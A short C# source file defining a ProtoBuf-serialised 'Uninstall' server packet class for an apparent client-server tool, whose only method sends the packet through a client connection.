using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Uninstall : IPacket
    {
        public Uninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send<Uninstall>(this);
        }
    }
}